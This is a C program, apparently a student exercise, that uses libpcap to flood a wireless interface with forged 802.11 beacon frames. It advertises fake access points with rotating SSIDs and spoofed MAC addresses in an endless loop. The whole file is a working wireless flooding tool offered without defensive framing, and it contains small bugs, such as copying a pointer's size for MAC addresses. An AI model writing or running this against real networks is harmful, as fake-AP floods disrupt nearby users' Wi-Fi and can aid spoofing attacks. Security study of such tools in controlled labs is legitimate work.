#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pcap.h>

#define SSID_LENGTH 31
#define PAYLOAD_LENGTH 7

const u_char MAC[6] = {0xf2, 0x1f, 0xf1, 0x33, 0x88, 0x50};
const u_char temp_supported_rates[16] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18,0x24,0x32,0x04,0x30,0x48,0x60,0x6c};
const char* payload[PAYLOAD_LENGTH] = {"AAAAAAAAAAAAAAA", "BBBBB","밥 사주세요 멘토님","^오^b","test","카라멜 마끼아또","CCCCCCCCCC"};

struct RadioHeader{
	u_char rad_rev;
	u_char rad_pad;
	short  rad_len;
	u_char rad_present[20];
};

struct BeaconFrame{
	struct RadioHeader RadioHdr;
	short FrameControl;
	short Duration;
	u_char DestinationAddress[6];
	u_char SourceAddress[6];
	u_char BSSID[6];
	short Seq_ctl;
	long long int Timestamp;
	short BeaconInterval;
	short CapabilityInfo;
	u_char TagNumber;
	u_char SSIDLength;
	u_char SSID[SSID_LENGTH];
	u_char SupportedRates[16];
	u_char channel[3];
};

void setRadioHdr(struct RadioHeader *p_rad);
void setBeaconFrame(struct BeaconFrame *p_bc, const char *ssid, u_char *mac);
void sendPacket(pcap_t *handle, struct BeaconFrame *p_bc);

int main(int argc, char **argv){

    int idx = 0;

    if(argc < 2){
        printf("Put interface name where you want to flood in argv!\n");
        return 0;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;

	handle = pcap_open_live(argv[1], BUFSIZ,1, 1000, errbuf);
    if(!handle){
			fprintf(stderr,"\n Error occured while opening the adapter");
			return 0;
	}

    struct BeaconFrame *frame;

	frame = malloc(sizeof(struct BeaconFrame));
	memset(frame,0, sizeof(struct BeaconFrame));

	setRadioHdr(&(frame->RadioHdr));
	

    while(1){
        u_char temp_mac[6];
        memcpy(temp_mac, MAC,sizeof(MAC));
        temp_mac[5] += idx;


        setBeaconFrame(frame, payload[idx], temp_mac);
        sendPacket(handle,frame);
        usleep(1000);

        idx ++;
        idx = idx % (sizeof(payload) / sizeof(char *));
        printf("idx: %d \n", idx);
	}

    free(frame);
}

void sendPacket(pcap_t *handle, struct BeaconFrame *p_bc){
    //printf("BeaconFrame size: %ld \n", sizeof(struct BeaconFrame));

    if (pcap_sendpacket(handle,(const u_char *)p_bc, sizeof(struct BeaconFrame)) != 0)
    {
        fprintf(stderr,"\nError sending the packet: %s \n", pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }
    printf("packet Sended!\n");
}

void setBeaconFrame(struct BeaconFrame *p_bc, const char* ssid, u_char *mac){

	p_bc->FrameControl = 0x0080;
	p_bc->Duration = 0x0;
	memset(p_bc->DestinationAddress,0xff,sizeof(p_bc->DestinationAddress));

	memcpy(p_bc->SourceAddress,mac,sizeof(mac));
	memcpy(p_bc->BSSID,mac,sizeof(mac));

	p_bc->Seq_ctl = 0x0;
	p_bc->Timestamp = 0x0;
	p_bc->BeaconInterval = 0x0064; // 0.1 second
	p_bc->CapabilityInfo = 0x0411;


	p_bc->TagNumber = 0x0;

    // set SSID & SSID Length
    strcpy(p_bc->SSID, ssid);
    memset(p_bc->SSID + strlen(ssid),0x20, sizeof(p_bc->SSID) - strlen(ssid));
	
	p_bc->SSIDLength = sizeof(p_bc->SSID);

	memcpy(p_bc->SupportedRates, temp_supported_rates, sizeof(p_bc->SupportedRates));

	p_bc->channel[0] = 3;
	p_bc->channel[1] = 1;
	p_bc->channel[2] = 6;

    printf("sizeof SSIDength: %ld \n", sizeof(p_bc->SSID));
    printf("SSID: %s\n", ssid);
    printf("BSSID: %02x:%02x:%02x:%02x:%02x:%02x \n", mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
}

void setRadioHdr(struct RadioHeader *p_rad){
	p_rad->rad_rev = 0;
	p_rad->rad_pad = 0;
	p_rad->rad_len = 24;

	memset(p_rad->rad_present, 0, sizeof(p_rad->rad_present));
}
